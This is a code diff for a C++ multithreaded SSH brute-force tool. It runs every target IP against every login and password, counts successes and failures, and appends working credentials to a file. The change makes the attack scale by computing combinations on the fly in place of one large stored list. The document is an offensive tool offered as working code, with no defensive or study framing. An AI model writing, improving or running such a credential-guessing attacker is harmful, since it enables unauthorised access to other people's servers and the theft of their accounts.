@@ -134,28 +134,20 @@ int main() {
         return 1;
     }
 
-    // Build all combinations: {ip, login, password}
-    struct Task {
-        string ip;
-        string login;
-        string password;
-    };
-    vector<Task> tasks;
-    tasks.reserve(targets.size() * logins.size() * passwords.size());
-    for (const auto& ip : targets)
-        for (const auto& login : logins)
-            for (const auto& pass : passwords)
-                tasks.push_back({ip, login, pass});
-
     ofstream outFile(outputFile, ios::app);
     if (!outFile) {
         cerr << "[-] Can't open output file: " << outputFile << endl;
         return 1;
     }
 
+    // Total combinations computed on-the-fly to avoid allocating huge vector
+    const size_t totalTasks = targets.size() * logins.size() * passwords.size();
+    const size_t passCount = passwords.size();
+    const size_t loginCount = logins.size();
+
     atomic<size_t> nextIndex(0);
     const size_t effectiveThreadCount =
-        min(static_cast<size_t>(threadCount), tasks.size());
+        min(static_cast<size_t>(threadCount), totalTasks);
 
     Stats stats;
     mutex statsMutex;
@@ -166,16 +158,22 @@ int main() {
         workers.emplace_back([&]() {
             while (true) {
                 const size_t index = nextIndex.fetch_add(1);
-                if (index >= tasks.size()) break;
+                if (index >= totalTasks) break;
 
-                const Task& task = tasks[index];
-                const bool success = authorizeSsh(task.ip, port, task.login, task.password);
+                // Decode index into (ip, login, password) indices
+                const size_t ipIdx    = index / (loginCount * passCount);
+                const size_t loginIdx = (index / passCount) % loginCount;
+                const size_t passIdx  = index % passCount;
+
+                const bool success = authorizeSsh(
+                    targets[ipIdx], port, logins[loginIdx], passwords[passIdx]);
 
                 lock_guard<mutex> lock(statsMutex);
                 stats.check++;
                 if (success) {
                     stats.valid++;
-                    outFile << task.ip << " " << task.login << " " << task.password << "\n";
+                    outFile << targets[ipIdx] << " " << logins[loginIdx]
+                            << " " << passwords[passIdx] << "\n";
                     outFile.flush();
                 } else {
                     stats.bad++;
